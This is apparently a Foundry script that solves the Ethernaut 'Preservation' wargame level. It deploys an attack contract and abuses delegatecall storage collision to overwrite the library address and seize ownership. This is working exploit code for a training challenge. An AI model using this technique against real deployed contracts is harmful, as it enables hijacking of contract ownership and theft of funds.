// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";

import {AttackContract} from "../src/Level16.sol";

// ================================================================
// │                     LEVEL 16 - PRESERVATION                  │
// ================================================================
interface IPreservation {
    function setFirstTime(uint256 _timeStamp) external;
}

contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();
        IPreservation preservation = IPreservation(targetContractAddress);

        vm.startBroadcast();
        AttackContract attackContract = new AttackContract();

        // Set the timeZone1Library to the address of the AttackContract
        preservation.setFirstTime(uint256(uint160(address(attackContract))));

        // Call the setFirstTime function again but this time it will delegate to the attackContract
        // which will set the owner to the msg.sender
        preservation.setFirstTime(1);
        vm.stopBroadcast();
    }
}
